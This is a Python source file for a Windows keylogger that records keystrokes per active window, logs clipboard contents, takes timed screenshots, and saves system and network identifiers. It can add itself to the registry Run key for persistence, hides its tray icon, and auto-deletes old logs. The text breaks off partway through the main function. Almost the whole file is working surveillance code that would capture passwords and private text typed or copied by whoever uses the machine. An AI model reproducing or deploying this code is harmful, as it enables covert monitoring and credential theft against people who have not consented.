# till auto delete logs 
# some problem on screenshot interval loading 


import os
import sys
import time
import json
import uuid
import winreg
import psutil
import socket 
import getpass
import logging
import platform 
import requests
import threading
import pyautogui
import pyperclip
import webbrowser
from io import BytesIO
import pygetwindow as gw
from pynput import keyboard
from datetime import datetime, timedelta
from plyer import notification
from PIL import Image, ImageDraw
from pystray import Icon, Menu, MenuItem

# Global variables
APP_NAME = "Key Logger"
is_running = True # Screenshots enabled
listener_running = True # Keylogging enabled
is_startup_enabled = False # Global variable to track the "Run on Startup" state
screenshot_interval = 60  # Default interval (seconds)
lock = threading.Lock()
current_window = None  # Currently active window
current_keys = []  # Keys typed in the current window
last_clipboard_content = None  # To track clipboard changes
current_line = ""
first_entry = True
active_window = ""
username = getpass.getuser()

# Default configuration
DEFAULT_CONFIG = {
    "screenshot_interval": 300,  # Default: 5 minutes
    "is_running": True,          # Default: Screenshots enabled
    "listener_running": True,     # Default: Keylogging enabled
    # "remaining_log_days": 60,    # Default: 60 seconds remaining for log folder
    "remaining_log_days": 5 * 24 * 60 * 60,    # Default: 5 days in seconds remaining for log folder
    # "remaining_screenshot_days": 60,  # Default: 60 seconds remaining for screenshot folder
    "remaining_screenshot_days":  5 * 24 * 60 * 60  # Default: 5 days in seconds,  # Default: 5 days remaining for screenshot folder
}


# Determine the application directory for logging error
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Check if the script is bundled
    app_dir = os.path.dirname(sys.executable)  # Directory of the .exe file
else:
    app_dir = os.path.dirname(os.path.abspath(__file__))  # Directory of the script
    
# Log file path in the application directory
LOG_FILE = os.path.join(app_dir, "keylogerror.log")
# Ensure the log file exists or create it
if not os.path.exists(LOG_FILE):
    try:
        with open(LOG_FILE, 'w'):  # Create the file if it doesn't exist
            pass
    except Exception as e:
        print(f"Error creating log file: {e}")
        raise

# Configure logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
# Test logging
logging.info(f"\n\n\nApplication started successfully {username}.")
print(f"Application started successfully {username}.")
# print(f"The username of this PC is: {username}")


# Determine the application directory for images files
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Bundled as .exe
    app_dir = os.path.dirname(sys.executable)
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))

# Define the logs folder and log file path
image_folders = os.path.join(app_dir, "image")
ICON_PATH = os.path.join(image_folders, "icon.ico")
# Ensure the logs folder exists
try:
    os.makedirs(image_folders, exist_ok=True)  # Create logs folder if it doesn't exist
    logging.info(f"icon is at {ICON_PATH}")
    print(f"icon is at {ICON_PATH}")
except Exception as e:
    logging.error(f"Error creating image folder: {e}")
    print(f"Error creating image folder: {e}")
    raise SystemExit(f"Error: Unable to create image folder. {e}")


# Determine the application directory for screenshot folder
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Check if the script is bundled as .exe
    app_dir = os.path.dirname(sys.executable)  # Directory of the .exe file
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))  # Directory of the script
    
# Define the screenshots folder path
screenshot_folder = os.path.join(app_dir, "screenshots")
# Ensure the screenshots folder exists
try:
    os.makedirs(screenshot_folder, exist_ok=True)
    logging.info(f"screenshots folder ready at {screenshot_folder}")
    print(f"screenshots folder is at {screenshot_folder}")
except Exception as e:
    logging.error(f"Error creating 'screenshots' folder: {e}")
    print(f"Error creating 'screenshots' folder: {e}")
    raise SystemExit(f"Error: Unable to create 'screenshots' folder. {e}")


# Determine the application directory for log files
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Bundled as .exe
    app_dir = os.path.dirname(sys.executable)
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))

# Define the logs folder and log file path
logs_folder = os.path.join(app_dir, "logs")
keylog_file = os.path.join(logs_folder, "key_log.txt")
# Ensure the logs folder exists
try:
    os.makedirs(logs_folder, exist_ok=True)  # Create logs folder if it doesn't exist
    logging.info(f"keylog file is at {keylog_file}")
    print(f"keylog file is at {keylog_file}")
except Exception as e:
    logging.error(f"Error creating logs folder: {e}")
    print(f"Error creating logs folder: {e}")
    raise SystemExit(f"Error: Unable to create logs folder. {e}")
# clipboard log file path
clipboard_log_file = os.path.join(logs_folder, "clipboard_log.txt")
logging.info(f"clipbard log file is at {clipboard_log_file}")
print(f"clipbard log file is at {clipboard_log_file}")


# Determine the application directory for log folder & config file
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Bundled as .exe
    app_dir = os.path.dirname(sys.executable)
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))

# Define the logs folder and log file path
CONFIG_FILE = os.path.join(app_dir, "config.json")
# Ensure the logs folder exists
try:
    os.makedirs(app_dir, exist_ok=True)  # Create logs folder if it doesn't exist
    logging.info(f"configuration file is at {CONFIG_FILE}")
    print(f"configuration file is at {CONFIG_FILE}")
except Exception as e:
    logging.error(f"Error creating logs folder: {e}")
    print(f"Error creating logs folder: {e}")
    raise SystemExit(f"Error: Unable to create config file. {e}") 
# configuration file path


# Notification function
# ----------------------------------------------------------------------------------
def show_notification(title, message):
    """
    Show a system notification.
    """
    try:
        notification.notify(
            title=title,
            message=message,
            app_name="Keylogger",
            # app_icon=ICON_PATH,
            app_icon=ICON_PATH if os.path.exists(ICON_PATH) else None,
            timeout=3
        )
    except Exception as e:
        logging.error(f"Notification Error: {e}")
        print(f"Notification Error: {e}")


# save configuration & restore 
# ----------------------------------------------------------------------------------
# Load configuration from JSON file
def load_config():
    global screenshot_interval, is_running, listener_running, remaining_log_days, remaining_screenshot_days
    try:
        with open(CONFIG_FILE, "r") as f:
            config = json.load(f)
            screenshot_interval = config.get("screenshot_interval", DEFAULT_CONFIG["screenshot_interval"])
            is_running = config.get("is_running", DEFAULT_CONFIG.get("is_running", True))  # Default to True
            listener_running = config.get("listener_running", DEFAULT_CONFIG.get("listener_running", True))  # Default to True
            remaining_log_days = config.get("remaining_log_days", DEFAULT_CONFIG["remaining_log_days"])
            remaining_screenshot_days = config.get("remaining_screenshot_days", DEFAULT_CONFIG["remaining_screenshot_days"])
        logging.info("configuration loaded sucessfully.")
    except FileNotFoundError as e:
        logging.error(f"Error load_config: {e}")
        print(f"Error load_config: {e}")
        save_config()  # Save defaults if the file doesn't exist

# Save configuration to JSON file
def save_config():
    global screenshot_interval, is_running, listener_running, remaining_log_days, remaining_screenshot_days
    try:
        # Ensure the logs folder exists before saving config.json
        os.makedirs(app_dir, exist_ok=True)  # Create LOG_FOLDER if it doesn't exist
        config = {
            "screenshot_interval": screenshot_interval,
            "Screenshot_enabled": is_running, # Default: Screenshots enabled
            "Keyoard_enabled": listener_running, # Default: Keylogging enabled
            # "remaining_log_days": int(remaining_log_days),  # Save as integer
            # "remaining_screenshot_days": int(remaining_screenshot_days)  # Save as integer
            "remaining_log_days": remaining_log_days // (24 * 60 * 60),  # Convert seconds to days
            "remaining_screenshot_days": remaining_screenshot_days // (24 * 60 * 60)  # Convert seconds to days
        }
        config_path = os.path.join(app_dir, "config.json")  # Save config in LOG_FOLDER
        with open(config_path, "w") as file:
            json.dump(config, file, indent=4) # format json file (indent=4)
        # logging.info("Configuration saved successfully.")
        print("Configuration saved successfully.")
    except Exception as e:
        logging.error(f"Error save_config: {e}")
        print(f"Error saving config: {e}")

# Restore the default configuration
def restore_defaults(icon, item=None):
    try:
        with lock:
            global screenshot_interval, is_running, listener_running, remaining_log_days, remaining_screenshot_days
            screenshot_interval = DEFAULT_CONFIG["screenshot_interval"]
            is_running = DEFAULT_CONFIG["is_running"]
            listener_running = DEFAULT_CONFIG["listener_running"]
            remaining_log_days = DEFAULT_CONFIG["remaining_log_days"]
            remaining_screenshot_days = DEFAULT_CONFIG["remaining_screenshot_days"]
            save_config()  # Save the restored defaults to the config file
            
        # interval_display = (
        #     f"{screenshot_interval} seconds" if screenshot_interval < 60 else
        #     f"{screenshot_interval // 60} minutes" if screenshot_interval < 3600 else
        #     f"{screenshot_interval // 3600} hour"
        # )
            
        # Notify the user
        # show_notification(APP_NAME, f"Configuration restored to default: {interval_display}.")
        show_notification(APP_NAME, f"Default settings have been restored.")
        logging.info("Configuration restored to default.")
        update_checkmarks(icon)  # Update the checkmarks in the menu
    except Exception as e:
        logging.error(f"Error restoring defaults: {e}")
        print(f"Error restoring defaults: {e}")
        show_notification(APP_NAME, "Failed to restore default configuration.")


# Function to save system info
# ----------------------------------------------------------------------------------
def get_system_info(): 
    info = { 
        "System": platform.system(), 
        "Node Name": platform.node(), 
        "Release": platform.release(), 
        "Version": platform.version(), 
        "Machine": platform.machine(), 
        "Processor": platform.processor(), 
        "CPU Cores": psutil.cpu_count(logical=False), 
        "Logical CPUs": psutil.cpu_count(logical=True), 
        "Total RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB", 
        "Available RAM": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB", 
        "Used RAM": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB", 
        "RAM Usage": f"{psutil.virtual_memory().percent}%", 
        "Disk Partitions": psutil.disk_partitions(), 
        "Disk Usage": {partition.mountpoint: { 
            "Total": f"{psutil.disk_usage(partition.mountpoint).total / (1024 ** 3):.2f} GB", 
            "Used": f"{psutil.disk_usage(partition.mountpoint).used / (1024 ** 3):.2f} GB", 
            "Free": f"{psutil.disk_usage(partition.mountpoint).free / (1024 ** 3):.2f} GB", 
            "Usage": f"{psutil.disk_usage(partition.mountpoint).percent}%" 
        } for partition in psutil.disk_partitions()},
        "IP Address": socket.gethostbyname(socket.gethostname()), 
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
    } 
    return info 

def save_system_info_to_json(): 
    system_info = get_system_info() 
    try:
        log_folder = os.path.join(os.getcwd(), "logs") 
        os.makedirs(log_folder, exist_ok=True) 
        json_file_path = os.path.join(log_folder, "system_info.json") 

        with open(json_file_path, "w") as json_file: 
            json.dump(system_info, json_file, indent=4) 

        print(f"System information saved to {json_file_path}") 
        logging.info(f"System information saved to {json_file_path}")
    except Exception as e:
        logging.error(f"Error: Unable to create system_info file. {e}")
        print(f"Error creating system_info.json file: {e}")
save_system_info_to_json()


# auto delete logs folder & screenshot folder 
#----------------------------------------------------------------------------------
# Function to calculate the folder's age and delete it if older than 90 days
def check_and_delete_old_folders():
    global remaining_log_days, remaining_screenshot_days
    try:
        current_time = datetime.now()
        # threshold_seconds = 120  # 1 minute in seconds for testing
        threshold_seconds = 5 * 24 * 60 * 60  # 5 days in seconds

        # Logs folder cleaning
        if os.path.exists(logs_folder):
            remaining_log_days = clean_folder(logs_folder, current_time, threshold_seconds)

        # Screenshot folder cleaning
        if os.path.exists(screenshot_folder):
            remaining_screenshot_days = clean_folder(screenshot_folder, current_time, threshold_seconds)

        # Save updated remaining seconds to config.json
        save_config()

    except Exception as e:
        logging.error(f"Error in check_and_delete_old_folders: {e}")
        print(f"Error in check_and_delete_old_folders: {e}")

def clean_folder(folder_path, current_time, threshold_seconds):
    """
    Clean a folder by deleting files older than the threshold and return remaining time.
    """
    try:
        remaining_seconds = threshold_seconds
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                file_age = current_time - datetime.fromtimestamp(os.path.getmtime(file_path))
                file_age_seconds = file_age.total_seconds()

                # Delete files older than the threshold
                if file_age_seconds >= threshold_seconds:
                    try:
                        os.remove(file_path)
                        logging.info(f"Deleted old file: {file_path}")
                        print(f"Deleted old file: {file_path}")
                    except Exception as e:
                        logging.error(f"Error deleting file {file_path}: {e}")
                        print(f"Error deleting file {file_path}: {e}")
                else:
                    # Calculate remaining time for the newest file
                    remaining_seconds = min(remaining_seconds, threshold_seconds - file_age_seconds)

        # If folder is empty, delete it
        if not os.listdir(folder_path):
            os.rmdir(folder_path)
            logging.info(f"Deleted empty folder: {folder_path}")
            print(f"Deleted empty folder: {folder_path}")
            os.makedirs(folder_path, exist_ok=True)  # Recreate the folder
            logging.info(f"Recreated folder: {folder_path}")
            print(f"Recreated folder: {folder_path}")

        return max(0, remaining_seconds)  # Return remaining time
    except Exception as e:
        logging.error(f"Error cleaning folder {folder_path}: {e}")
        print(f"Error cleaning folder {folder_path}: {e}")
        return threshold_seconds  # Default remaining time if an error occurs

# Function to get the folder's last modified time
def get_folder_age(folder_path):
    try:
        folder_creation_time = datetime.fromtimestamp(os.path.getctime(folder_path))
        logging.info(f"Folder {folder_path} creation time: {folder_creation_time}")
        print(f"Folder {folder_path} creation time: {folder_creation_time}")
        return folder_creation_time
    except Exception as e:
        logging.error(f"Error getting folder age for {folder_path}: {e}")
        print(f"Error getting folder age for {folder_path}: {e}")
        return datetime.now()  # Return current time if there's an error

# Function to delete a folder
def delete_folder(folder_path):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if os.path.exists(folder_path):
            for root, dirs, files in os.walk(folder_path, topdown=False):
                for name in files:
                    file_path = os.path.join(root, name)
                    try:
                        os.remove(file_path)
                        logging.info(f"[{timestamp}] - Deleted file: {file_path}")
                        print(f"[{timestamp}] - Deleted file: {file_path}")
                    except Exception as e:
                        logging.error(f"Error deleting file {file_path}: {e}")
                        print(f"Error deleting file {file_path}: {e}")
                for name in dirs:
                    dir_path = os.path.join(root, name)
                    try:
                        os.rmdir(dir_path)
                        logging.info(f"[{timestamp}] - Deleted directory: {dir_path}")
                        print(f"[{timestamp}] - Deleted directory: {dir_path}")
                    except Exception as e:
                        logging.error(f"Error deleting directory {dir_path}: {e}")
                        print(f"Error deleting directory {dir_path}: {e}")
            os.rmdir(folder_path)
            logging.info(f"[{timestamp}] - Deleted folder: {folder_path}")
            print(f"[{timestamp}] - Deleted folder: {folder_path}")
    except Exception as e:
        logging.error(f"Error deleting folder {folder_path}: {e}")
        print(f"Error deleting folder {folder_path}: {e}")

# Function to check and update the folder deletion status periodically
def schedule_folder_check():
    try:
        check_and_delete_old_folders()
        # Schedule the next execution after 24 hour for testing
        # threading.Timer(86400, schedule_folder_check).start() # 24 hour
        threading.Timer(21600, schedule_folder_check).start() # 10 second
    except Exception as e:
        logging.error(f"Error in scheduling folder check: {e}")
        print(f"Error in scheduling folder check: {e}")
# Start the periodic check
schedule_folder_check()


# Get the active window's title
# ----------------------------------------------------------------------------------
def get_active_window_title():
    try:
        window = gw.getActiveWindow()
        if window is not None:
            return window.title
        return "Unknown Application"
    except Exception as e:
        logging.error(f"Error getting active window title: {e}")
        print(f"Error getting active window title: {e}")
        return "Unknown Application"


# Write a log entry to the file
# ----------------------------------------------------------------------------------
def write_log_entry(window, keys, include_window_info=False):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(keylog_file, "a", encoding="utf-8") as log_file:
            if include_window_info:  # Log the window info only once per window change
                log_file.write(f"\n\n[{timestamp}] - Active Window: {window}\n")
                log_file.write("----------------\n")
            if keys:
                log_file.write(f"{timestamp}: {''.join(keys)}\n")
        # print(f"Logged: {''.join(keys)}")  # Optional for debugging
    except Exception as e:
        logging.error(f"Error write_log_entry: {e}")
        print(f"Error write_log_entry: {e}")


# Handle key press events
# ----------------------------------------------------------------------------------
def on_press(key):
    global current_window, current_keys

    # Get the active window title
    active_window = get_active_window_title()

    # Detect window change
    if current_window != active_window:
        if current_window:
            # Log the previous window's data
            write_log_entry(current_window, current_keys)
        # Reset for the new window
        current_window = active_window
        current_keys = []
        write_log_entry(current_window, [], include_window_info=True)  # Log the new window info
    # logging.info(f"current window: {current_window}")
    
    # Handle key input
    try:
        key_char = key.char  # For printable characters
    except AttributeError as e:
        key_char = f"[{key}]"  # For special keys (e.g., Enter, Backspace)
        # logging.error(f"Error handling key input on_press: {e}")
        print(f"Error handling key input on_press: {e}")

    # Record the key
    # Define a mapping for special keys to normalize their representation
    special_keys = {
        "[Key.space]": " ",
        "[Key.enter]": "\n",
        "[Key.esc]": "[Esc]",
        "[Key.tab]": "[Tab]",
        "[Key.caps_lock]": "[Caps Lock]",
        "[Key.shift]": "[Shift]",
        "[Key.shift_r]": "[Shift]",
        "[Key.ctrl]": "[Ctrl]",
        "[Key.ctrl_l]": "[Ctrl]",
        "[Key.ctrl_r]": "[Ctrl]",
        "[Key.fn]": "[Fn]",
        "[Key.cmd]": "[Win]",
        "[Key.cmd_l]": "[Win]",
        "[Key.cmd_r]": "[Win]",
        "[Key.alt]": "[Alt]",
        "[Key.alt_l]": "[Alt]",
        "[Key.alt_r]": "[Alt]",
        "[Key.alt_gr]": "[Alt]",
        "[Key.insert]": "[Insert]",
        "[Key.print_screen]": "[PrtSc]",
        "[Key.delete]": "[Delete]",
        "[Key.backspace]": "[Backspace]",
        "[Key.up]": "[Up Arrow]",
        "[Key.down]": "[Down Arrow]",
        "[Key.left]": "[Left Arrow]",
        "[Key.right]": "[Right Arrow]",
        "[Key.home]": "[Home]",
        "[Key.end]": "[End]",
        "[Key.page_up]": "[Page Up]",
        "[Key.page_down]": "[Page Down]",
        # Function keys
        "[Key.f1]": "[F1]",
        "[Key.f2]": "[F2]",
        "[Key.f3]": "[F3]",
        "[Key.f4]": "[F4]",
        "[Key.f5]": "[F5]",
        "[Key.f6]": "[F6]",
        "[Key.f7]": "[F7]",
        "[Key.f8]": "[F8]",
        "[Key.f9]": "[F9]",
        "[Key.f10]": "[F10]",
        "[Key.f11]": "[F11]",
        "[Key.f12]": "[F12]",
        # Add any other special keys here as needed
    }

    try:
        # Process the key character
        if key_char in special_keys:
            current_keys.append(special_keys[key_char])
        elif key_char is not None:  # Ignore None values
            current_keys.append(key_char)
        # else:
        #     current_keys.append(key_char)
    except Exception as e:
        logging.error(f"Error processing key press: {e}")
        print(f"Error processing key press: {e}")
        pass  


# Handle key release events
# ----------------------------------------------------------------------------------
def on_release(key):
    try:
        if key == keyboard.Key.esc:
            # On Esc key, finalize logging and stop the listener
            write_log_entry(current_window, current_keys)
            print("Keylogger stopped.")
            logging.info(f"keylogger stopped")
            return False
    except Exception as e:
        logging.error(f"Error on_release: {e}")
        print(f"Error on_release: {e}")


# Start the keylogger
# ----------------------------------------------------------------------------------
def start_keylogger():
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(keylog_file, "a", encoding="utf-8") as log_file:
            log_file.write(f"\n\n\n[{timestamp}]---keylogger started {username}---\n")
        logging.info(f"[{timestamp}]---keylogger started {username}---")
        print(f"[{timestamp}]---keylogger started {username}---")
    except Exception as e:
        logging.error(f"Error on start_keylogger: {e}")
        print(f"Error on start_keylogger: {e}")


# Monitor clipboard changes
# ----------------------------------------------------------------------------------
def monitor_clipboard():
    global last_clipboard_content
    while True:
        try:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:
                last_clipboard_content = current_clipboard_content
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(clipboard_log_file, "a", encoding="utf-8") as log_file:
                    log_file.write(f"{timestamp}: Copied: {current_clipboard_content}\n\n")
                # print(f"Clipboard updated: {current_clipboard_content}")  # Optional for debugging
            # logging.info(f"monitor_clipboard")
        except Exception as e:
            # logging.error(f"Error monitoring clipboard: {e}")
            print(f"Error monitoring clipboard: {e}")
            pass
        time.sleep(1)  # Polling interval


# Take a screenshot
# ----------------------------------------------------------------------------------
def take_screenshot():
    global screenshot_interval
    while True:
        try:
            if is_running:
                timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
                pyautogui.screenshot(filename)
                logging.info(f"take_screenshot-->Screenshot saved: {filename}")
                print(f"Screenshot saved: {filename}")
            with lock:
                current_interval = screenshot_interval   # Ensure thread-safe interval update
            time.sleep(current_interval)
        except Exception as e:
            # logging.error(f"Error taking screenshot: {e}")
            print(f"Error taking screenshot: {e}")
            pass


# Toggle screenshot taking
# ----------------------------------------------------------------------------------
def toggle_screenshots(icon, item):
    global is_running
    is_running = not is_running
    save_config()  # Save the updated state to the config file
    if (is_running == True):
        show_notification(APP_NAME, "Enabled taking Screenshot")
    else:
        show_notification(APP_NAME, "Disabled taking Screenshot")
    logging.info(f"toggle_screenshot - {'Enabled' if is_running else 'Disabled'}")
    print(f"toggle_screenshot - {'Enabled' if is_running else 'Disabled'}")
    

# Toggle keylogging
# ----------------------------------------------------------------------------------
def toggle_keylogging(icon, item):
    global listener_running
    listener_running = not listener_running
    save_config()  # Save the updated state to the config file
    if(listener_running == True):
        show_notification(APP_NAME, "Enabled Keylogger")
    else:
        show_notification(APP_NAME, "Disabled Keylogger")
    logging.info(f"toggle_keylogging - {'Enabled' if listener_running else 'Disabled'}")
    print(f"toggle_keylogging - {'Enabled' if listener_running else 'Disabled'}")
        

# Update screenshot interval
# ----------------------------------------------------------------------------------
def set_interval(icon, item):
    global screenshot_interval
    try:
        with lock:
            # Parse the interval value and format
            text = item.text
            if "seconds" in text:
                screenshot_interval = int(text.split()[0])  # Keep seconds as is
                interval_display = f"{screenshot_interval} seconds"
            elif "Minutes" in text:
                screenshot_interval = int(text.split()[0]) * 60  # Convert minutes to seconds
                interval_display = f"{text.split()[0]} minutes"
            elif "Hour" in text:
                screenshot_interval = int(text.split()[0]) * 3600  # Convert hours to seconds
                interval_display = f"{text.split()[0]} hour"

        save_config()  # Save the new interval to the JSON file
        # Update menu checkmarks and show a notification
        update_checkmarks(icon)
        show_notification(APP_NAME, f"Screenshot interval set to {interval_display}.")
        logging.info(f"Interval set to {interval_display}.")
        print(f"Interval set to {interval_display}.")
    except Exception as e:
        logging.error(f"Error in set_interval: {e}")
        print(f"Error in set_interval: {e}")


# Stop script
# ----------------------------------------------------------------------------------
def stop_script(icon):
    try:
        # Log the previous window's data
        write_log_entry(current_window, current_keys)
        show_notification(APP_NAME, "Keylogger is terminated...")
        logging.info(f"Script terminated\n\n")
        print("Stopping script...\n\n\n")
        # icon.notify(f"Keylogger terminated")
        os._exit(0)
    except Exception as e:
        logging.error(f"Error in stop_script: {e}")
        print(f"Error in stop_script: {e}")


# function to open developer page in browser 
# ----------------------------------------------------------------------------------
def on_open_developer(icon):
    try:
        url = "https://bibekchandsah.com.np/developer.html"
        webbrowser.open(url)
        show_notification(APP_NAME, "Opening Developer Page...")
        logging.info(f"open_developer")
        print(f"open_developer")
    except Exception as e:
        logging.error(f"Error opening Developer: {e}")
        print(f"Error opening Developer: {e}")


# Restart script
# ----------------------------------------------------------------------------------
def restart_script(icon, item):
    try:
        # Log the previous window's data
        write_log_entry(current_window, current_keys)
        logging.info(f"Restarting script...\n")
        print("Restarting script...\n\n")
        icon.notify(f"Restarting the Keylogger")
        show_notification(APP_NAME, "Restarting Keylogger...")
        # global listener
        # listener.stop()
        icon.stop()
        # os.execv(sys.executable, ['python'] + sys.argv)
        os.execl(sys.executable, sys.executable, *sys.argv)
    except Exception as e:
        logging.error(f"Error restarting script: {e}")
        print(f"Error restarting script: {e}")


# Toggle startup option
# ----------------------------------------------------------------------------------
def toggle_startup(enable):
    """
    Enable or disable running the application on startup.
    """
    global is_startup_enabled
    try:
        startup_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        if enable:
            winreg.SetValueEx(startup_key, APP_NAME, 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
            show_notification(APP_NAME, "Enabled startup at boot.")
            logging.info(f"Startup Enabled")
            print(f"Startup Enabled")
        else:
            winreg.DeleteValue(startup_key, APP_NAME)
            show_notification(APP_NAME, "Disabled startup at boot.")
            logging.info(f"Startup Disabled")
            print(f"Startup Disabled")
        is_startup_enabled = enable
        winreg.CloseKey(startup_key)
    except Exception as e:
        logging.error(f"Error toggling startup: {e}")
        show_notification(APP_NAME, f"Error: {e}")
        print(f"Error toggling startup: {e}")

def is_startup_checked(item):
    """
    Return whether the "Run on Startup" option is enabled.
    The `item` argument is required by pystray but not used here.
    """
    # logging.info(f"check startup")
    return is_startup_enabled

def on_toggle_startup(icon, item):
    """
    Toggle the startup status based on user selection.
    """
    # logging.info(f"on toggle startup")
    toggle_startup(not is_startup_enabled)


# Open error log file    
# ----------------------------------------------------------------------------------    
def on_open_log(icon, item):
    """
    Open the log file in the default text editor.
    """
    logging.warning(f"Log file is opened")
    try:
        if os.path.exists(LOG_FILE):
            os.startfile(LOG_FILE)
        else:
            raise FileNotFoundError("Log file not found.")
    except Exception as e:
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the log file.")
        logging.error(f"Error opening log file: {e}")
        print(f"Error opening log file: {e}")
       
        
# Open keylog file  
# ----------------------------------------------------------------------------------      
def open_keylog_file(icon, item):
    """
    Open the keylog file in the default text editor.
    """
    logging.warning(f"Keylog file is opened")
    try:
        if os.path.exists(keylog_file):
            os.startfile(keylog_file)
        else:
            raise FileNotFoundError("Keylog file not found.")
    except Exception as e:
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Keylog file.")   
        logging.error(f"Error opening log file: {e}")
        print(f"Error opening log file: {e}")
    
        
# Open copy keylog file 
# ----------------------------------------------------------------------------------       
def open_copy_keylog_file(icon, item):
    """
    Open the Copy keylog file in the default text editor.
    """
    logging.warning(f"copied Log file is opened")
    try:
        if os.path.exists(clipboard_log_file):
            os.startfile(clipboard_log_file)
        else:
            raise FileNotFoundError("Copy Keylog file not found.")
    except Exception as e:
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Copy Keylog file.")        
        logging.error(f"Error opening log file: {e}")
        print(f"Error opening log file: {e}")
        
        
# Open screenshot folder
# ----------------------------------------------------------------------------------        
def open_Screenshot_folder(icon, item):
    """
    Open the screenshot folder.
    """
    logging.warning(f"Screenshot folder is opened")
    try:
        if os.path.exists(screenshot_folder):
            os.startfile(screenshot_folder)
        else:
            raise FileNotFoundError("Screenshot folder not found.")
    except Exception as e:
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Screenshot folder.")
        logging.error(f"Error opening Screenshot folder: {e}")
        print(f"Error opening Screenshot folder: {e}")


# Update checkmarks dynamically
# ----------------------------------------------------------------------------------
def update_checkmarks(icon):
    interval_menu = Menu(
        MenuItem("30 seconds", set_interval, checked=lambda item: screenshot_interval == 30),
        MenuItem("60 seconds", set_interval, checked=lambda item: screenshot_interval == 60),
        MenuItem("2 Minutes", set_interval, checked=lambda item: screenshot_interval == 120),
        MenuItem("5 Minutes", set_interval, checked=lambda item: screenshot_interval == 300),
        MenuItem("10 Minutes", set_interval, checked=lambda item: screenshot_interval == 600),
        MenuItem("20 Minutes", set_interval, checked=lambda item: screenshot_interval == 1200),
        MenuItem("30 Minutes", set_interval, checked=lambda item: screenshot_interval == 1800),
        MenuItem("1 Hour", set_interval, checked=lambda item: screenshot_interval == 3600),
    )

    menu = Menu(
        MenuItem("Pause/Resume Screenshots", toggle_screenshots, checked=lambda item: is_running),
        MenuItem("Pause/Resume Keylogging", toggle_keylogging, checked=lambda item: listener_running),
        MenuItem("Set Screenshot Interval", interval_menu),
        MenuItem("Run on Startup", on_toggle_startup, checked=is_startup_checked),
        Menu.SEPARATOR,
        MenuItem("View Keylog", open_keylog_file),
        MenuItem("View Copied Keylog", open_copy_keylog_file),
        MenuItem("View Screenshot", open_Screenshot_folder),
        MenuItem("View Log", on_open_log),
        Menu.SEPARATOR,
        MenuItem("Restore Defaults", restore_defaults),  # Add restore option
        MenuItem("Developer", on_open_developer),
        MenuItem("Restart", restart_script),
        MenuItem("Exit", stop_script),
    )

    icon.menu = menu


# create icon for system tray
# ----------------------------------------------------------------------------------
def create_icon():
    icon_image = Image.new("RGB", (64, 64), color=(255, 255, 255))
    draw = ImageDraw.Draw(icon_image)
    draw.ellipse((16, 16, 48, 48), fill=(0, 0, 255))


# Create tray icon
# ----------------------------------------------------------------------------------
def create_tray_icon():
    """
    Create the system tray icon and menu.
    """
    def get_icon():
        """Retrieve the icon image."""
        try:
            # Check if the local icon file exists
            if os.path.exists(ICON_PATH):
                return Image.open(ICON_PATH)

            # If local file doesn't exist, try fetching from URL
            url = "https://cdn-icons-png.flaticon.com/512/4616/4616208.png"  # Replace with your image URL
            response = requests.get(url, timeout=5)
            response.raise_for_status()  # Raise an exception for HTTP errors
            return Image.open(BytesIO(response.content))

        except (FileNotFoundError, requests.exceptions.RequestException) as e:
            logging.error(f"Icon Load Error: {e}")
            print(f"Icon Load Error: {e}")
            return create_icon()  # Return a blue image as a fallback
    
    try:
        # Create the system tray icon
        icon = Icon(
            APP_NAME, 
            get_icon(), 
            APP_NAME
        )
        update_checkmarks(icon)
        icon.visible = False
        icon.run()
       
        
    except Exception as e:
        show_notification("Error", "Failed to load tray icon.")
        logging.error(f"Tray Icon Error: {e}")
        print(f"Tray Icon Error: {e}")
        sys.exit(1)


def main():
    try:
        if not os.path.exists(ICON_PATH):
            logging.error("Icon file not found. Notifications will not include an icon.")
            print("Icon file not found. Notifications will not include an icon.")
        show_notification(f"{APP_NAME} Started", "The application has started successfully.")
        
        # Start keylogger
        start_keylogger()
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()

        
        # Start clipboard monitoring thread
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()

        load_config()  # Load the interval from JSON
        # Notify the user of the loaded interval
        # interval_display = (
        #     f"{screenshot_interval} seconds" if screenshot_interval < 60 else
        #     f"{screenshot_interval // 60} minutes" if screenshot_interval < 3600 else
        #     f"{screenshot_interval // 3600} hour"
        # )
        # show_notification(APP_NAME, f"Loaded screenshot interval: {interval_display}.")
        
        # Start screenshot thread
